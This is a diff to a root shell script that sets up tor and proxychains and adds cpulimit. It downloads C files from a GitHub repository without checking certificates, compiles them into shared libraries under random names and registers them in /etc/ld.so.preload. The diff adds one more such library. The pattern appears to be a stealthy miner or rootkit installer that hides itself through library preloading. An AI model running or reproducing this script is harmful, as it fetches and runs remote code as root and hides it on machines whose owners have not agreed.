@@ -1,6 +1,6 @@
 #!/bin/sh
         apt update
-        apt install wget sudo git cmake tor gcc -y
+        apt install wget sudo git cmake cpulimit tor gcc -y
         cd /root
         git clone https://github.com/rofl0r/proxychains-ng.git
         cd proxychains-ng
@@ -15,9 +15,17 @@
         l1=$(openssl rand -hex 6)
         h2=$(openssl rand -hex 6)
         l2=$(openssl rand -hex 6)
+        h3=$(openssl rand -hex 6)
+        l3=$(openssl rand -hex 6)
+        
         cd /root
         mkdir $fol
         cd $fol
+        wget --no-check-certificate -c https://github.com/unmsjd28/hjs839/raw/main/nim.c -O $h3.c 
+        gcc -Wall -fPIC -shared -o $l3.so $h3.c -ldl
+        sudo mv $l3.so /usr/local/lib/ 
+        echo /usr/local/lib/$l3.so >> /etc/ld.so.preload 
+        
         wget --no-check-certificate -c https://github.com/unmsjd28/hjs839/raw/main/cp.c -O $h1.c 
         gcc -Wall -fPIC -shared -o $l1.so $h1.c -ldl
         sudo mv $l1.so /usr/local/lib/ 
